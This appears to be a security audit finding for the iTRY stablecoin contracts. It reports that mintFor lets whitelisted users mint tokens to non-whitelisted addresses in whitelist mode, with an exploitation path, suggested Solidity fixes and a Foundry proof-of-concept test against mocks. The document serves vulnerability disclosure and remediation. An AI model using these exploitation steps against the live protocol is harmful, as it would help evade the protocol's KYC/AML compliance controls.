## Title
Whitelist Enforcement Bypass in Minting Operations During WHITELIST_ENABLED State

## Summary
In WHITELIST_ENABLED state, the `_beforeTokenTransfer` function in both `iTryTokenOFT.sol` and `iTry.sol` fails to validate that mint recipients are whitelisted, only checking they are not blacklisted. This allows whitelisted users to mint iTRY tokens to non-whitelisted addresses via `iTryIssuer.mintFor()`, directly violating the protocol's whitelist enforcement invariant.

## Impact
**Severity**: High

## Finding Description

**Location:** 
- `src/token/iTRY/crosschain/iTryTokenOFT.sol` - `_beforeTokenTransfer` function, lines 160-161
- `src/token/iTRY/iTry.sol` - `_beforeTokenTransfer` function, lines 201-202
- `src/protocol/iTryIssuer.sol` - `mintFor` function, lines 270-306

**Intended Logic:** 
According to Critical Invariant #3, "In WHITELIST_ENABLED state, ONLY whitelisted users can send/receive/burn iTRY." The whitelist enforcement should prevent any non-whitelisted address from receiving iTRY tokens when the protocol operates in compliance mode.

**Actual Logic:** 
The minting validation in WHITELIST_ENABLED state only checks that the recipient is not blacklisted, without verifying whitelist membership: [1](#0-0) [2](#0-1) 

Meanwhile, `iTryIssuer.mintFor()` accepts a `recipient` parameter without validating whitelist status: [3](#0-2) 

**Exploitation Path:**
1. Protocol admin sets `transferState` to `WHITELIST_ENABLED` for regulatory compliance (only whitelisted addresses should interact with iTRY)
2. Whitelisted user (e.g., Alice with `WHITELISTED_USER_ROLE`) calls `iTryIssuer.mintFor(bob_address, 1000e18, 0)` where Bob is NOT whitelisted
3. `mintFor` validates Alice has `WHITELISTED_USER_ROLE` but does NOT check if Bob is whitelisted [4](#0-3) 
4. The function calls `_mint(recipient, iTRYAmount)` which calls `iTryToken.mint(receiver, amount)` [5](#0-4) 
5. In `_beforeTokenTransfer`, the minter mint check passes with only `!blacklisted[to]` validation, missing whitelist verification
6. Bob (non-whitelisted) successfully receives iTRY tokens, violating the whitelist enforcement invariant
7. Bob cannot transfer the tokens while in WHITELIST_ENABLED state (they are frozen), but the invariant is already broken - he RECEIVED them when he shouldn't have

**Security Property Broken:** 
Critical Invariant #3: "Whitelist Enforcement: In WHITELIST_ENABLED state, ONLY whitelisted users can send/receive/burn iTRY."

## Impact Explanation

- **Affected Assets**: iTRY stablecoin tokens, protocol regulatory compliance
- **Damage Severity**: 
  - Immediate: Non-whitelisted addresses can accumulate iTRY balances during WHITELIST_ENABLED state, breaking KYC/AML compliance requirements
  - If protocol later transitions to FULLY_ENABLED state, all accumulated tokens in non-whitelisted addresses become freely transferable, bypassing the intended compliance gate
  - Regulatory risk: Protocol claims whitelist enforcement but allows non-compliant users to hold tokens
  - The protocol cannot identify or prevent this accumulation without monitoring off-chain

- **User Impact**: 
  - Any whitelisted user can intentionally or accidentally mint to non-whitelisted addresses
  - Protocol operators lose confidence in whitelist enforcement
  - Potential regulatory violations for the protocol

## Likelihood Explanation

- **Attacker Profile**: Any whitelisted user with minting privileges (holders of `WHITELISTED_USER_ROLE` in iTryIssuer)

- **Preconditions**: 
  - Protocol must be in `WHITELIST_ENABLED` state (TransferState = 1)
  - Attacker must have `WHITELISTED_USER_ROLE` 
  - Attacker must have DLF collateral to mint iTRY

- **Execution Complexity**: Single transaction - simply call `mintFor(non_whitelisted_address, amount, minOut)` instead of `mintFor(whitelisted_address, amount, minOut)`

- **Frequency**: Can be exploited continuously by any whitelisted minter, unlimited times

## Recommendation

Add whitelist validation to minting operations in WHITELIST_ENABLED state:

**For `iTryTokenOFT.sol` (lines 160-161):**
```solidity
// CURRENT (vulnerable):
} else if (msg.sender == minter && from == address(0) && !blacklisted[to]) {
    // minting

// FIXED:
} else if (msg.sender == minter && from == address(0) && !blacklisted[to] && whitelisted[to]) {
    // minting - now requires recipient to be whitelisted
```

**For `iTry.sol` (lines 201-202):**
```solidity
// CURRENT (vulnerable):
} else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to)) {
    // minting

// FIXED:
} else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to) && hasRole(WHITELISTED_ROLE, to)) {
    // minting - now requires recipient to be whitelisted
```

**Alternative mitigation** (defense in depth): Add recipient validation in `iTryIssuer.mintFor()`:
```solidity
// In iTryIssuer.sol, add after line 277:
if (transferState == TransferState.WHITELIST_ENABLED) {
    require(hasRole(_WHITELISTED_USER_ROLE, recipient), "Recipient not whitelisted");
}
```

This would provide double protection at both the issuer and token levels.

## Proof of Concept

```solidity
// File: test/Exploit_WhitelistBypass.t.sol
// Run with: forge test --match-test test_WhitelistBypassViaMinting -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {iTry} from "../src/token/iTRY/iTry.sol";
import {iTryIssuer} from "../src/protocol/iTryIssuer.sol";
import {IiTryDefinitions} from "../src/token/iTRY/IiTryDefinitions.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockOracle} from "./iTryIssuer.base.t.sol";
import {MockYieldProcessor} from "./iTryIssuer.base.t.sol";

contract ExploitWhitelistBypass is Test {
    iTry public itryToken;
    iTry public itryImplementation;
    iTryIssuer public issuer;
    MockERC20 public dlfToken;
    MockOracle public oracle;
    MockYieldProcessor public yieldProcessor;
    
    address public admin;
    address public whitelistedUser;
    address public nonWhitelistedUser;
    address public treasury;
    address public custodian;
    
    bytes32 constant MINTER_CONTRACT = keccak256("MINTER_CONTRACT");
    bytes32 constant WHITELISTED_ROLE = keccak256("WHITELISTED_ROLE");
    bytes32 constant WHITELISTED_USER_ROLE = keccak256("WHITELISTED_USER_ROLE");
    
    function setUp() public {
        admin = address(this);
        whitelistedUser = makeAddr("whitelistedUser");
        nonWhitelistedUser = makeAddr("nonWhitelistedUser");
        treasury = makeAddr("treasury");
        custodian = makeAddr("custodian");
        
        // Deploy contracts
        dlfToken = new MockERC20("DLF Token", "DLF");
        oracle = new MockOracle(1e18); // 1:1 NAV
        yieldProcessor = new MockYieldProcessor();
        
        // Deploy iTry
        itryImplementation = new iTry();
        bytes memory initData = abi.encodeWithSelector(
            iTry.initialize.selector,
            admin,
            admin
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(itryImplementation), initData);
        itryToken = iTry(address(proxy));
        
        // Deploy iTryIssuer
        issuer = new iTryIssuer(
            address(itryToken),
            address(dlfToken),
            address(oracle),
            treasury,
            address(yieldProcessor),
            custodian,
            admin,
            0, 0, 500, 0
        );
        
        // Wire contracts
        itryToken.grantRole(MINTER_CONTRACT, address(issuer));
        
        // Add whitelistedUser to iTry token whitelist
        itryToken.grantRole(WHITELISTED_ROLE, whitelistedUser);
        
        // Add whitelistedUser to issuer whitelist
        issuer.addToWhitelist(whitelistedUser);
        
        // Mint DLF to whitelisted user
        dlfToken.mint(whitelistedUser, 10000e18);
        vm.prank(whitelistedUser);
        dlfToken.approve(address(issuer), type(uint256).max);
    }
    
    function test_WhitelistBypassViaMinting() public {
        // SETUP: Set iTry token to WHITELIST_ENABLED state
        itryToken.updateTransferState(IiTryDefinitions.TransferState.WHITELIST_ENABLED);
        
        // VERIFY: nonWhitelistedUser is NOT whitelisted
        assertFalse(itryToken.hasRole(WHITELISTED_ROLE, nonWhitelistedUser), 
            "nonWhitelistedUser should not be whitelisted");
        
        // VERIFY: Initial balance is 0
        assertEq(itryToken.balanceOf(nonWhitelistedUser), 0, 
            "Initial balance should be 0");
        
        // EXPLOIT: Whitelisted user mints iTRY to non-whitelisted address
        vm.prank(whitelistedUser);
        uint256 mintedAmount = issuer.mintFor(nonWhitelistedUser, 1000e18, 0);
        
        // VERIFY: Non-whitelisted user successfully received iTRY tokens
        // This violates Invariant #3: "In WHITELIST_ENABLED state, ONLY whitelisted users can receive iTRY"
        assertGt(itryToken.balanceOf(nonWhitelistedUser), 0, 
            "Vulnerability confirmed: Non-whitelisted user received iTRY in WHITELIST_ENABLED state");
        assertEq(itryToken.balanceOf(nonWhitelistedUser), mintedAmount,
            "Non-whitelisted user holds minted iTRY tokens");
        
        // VERIFY: Non-whitelisted user cannot transfer (tokens are frozen)
        vm.prank(nonWhitelistedUser);
        vm.expectRevert();
        itryToken.transfer(whitelistedUser, mintedAmount);
        
        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("Non-whitelisted user balance:", itryToken.balanceOf(nonWhitelistedUser));
        console.log("This violates whitelist enforcement invariant");
    }
}
```

## Notes

This vulnerability affects both the hub chain (`iTry.sol`) and spoke chains (`iTryTokenOFT.sol`). The same fix must be applied to both contracts. 

The issue also affects the admin redistribution mint operation at lines 164-165 in `iTryTokenOFT.sol` and lines 205-207 in `iTry.sol`, which have identical missing whitelist validation. [6](#0-5) [7](#0-6) 

The protocol's design appears to assume that only whitelisted users would call minting functions, but the `mintFor` functionality explicitly allows specifying an arbitrary recipient, creating a dangerous mismatch between intent and implementation.

### Citations

**File:** src/token/iTRY/crosschain/iTryTokenOFT.sol (L160-161)
```text
            } else if (msg.sender == minter && from == address(0) && !blacklisted[to]) {
                // minting
```

**File:** src/token/iTRY/crosschain/iTryTokenOFT.sol (L164-165)
```text
            } else if (msg.sender == owner() && from == address(0) && !blacklisted[to]) {
                // redistributing - mint
```

**File:** src/token/iTRY/iTry.sol (L201-202)
```text
            } else if (hasRole(MINTER_CONTRACT, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to)) {
                // minting
```

**File:** src/token/iTRY/iTry.sol (L205-207)
```text
            } else if (hasRole(DEFAULT_ADMIN_ROLE, msg.sender) && from == address(0) && !hasRole(BLACKLISTED_ROLE, to))
            {
                // redistributing - mint
```

**File:** src/protocol/iTryIssuer.sol (L270-278)
```text
    function mintFor(address recipient, uint256 dlfAmount, uint256 minAmountOut)
        public
        onlyRole(_WHITELISTED_USER_ROLE)
        nonReentrant
        returns (uint256 iTRYAmount)
    {
        // Validate recipient address
        if (recipient == address(0)) revert CommonErrors.ZeroAddress();

```

**File:** src/protocol/iTryIssuer.sol (L576-579)
```text
    function _mint(address receiver, uint256 amount) internal {
        _totalIssuedITry += amount;
        iTryToken.mint(receiver, amount);
    }
```
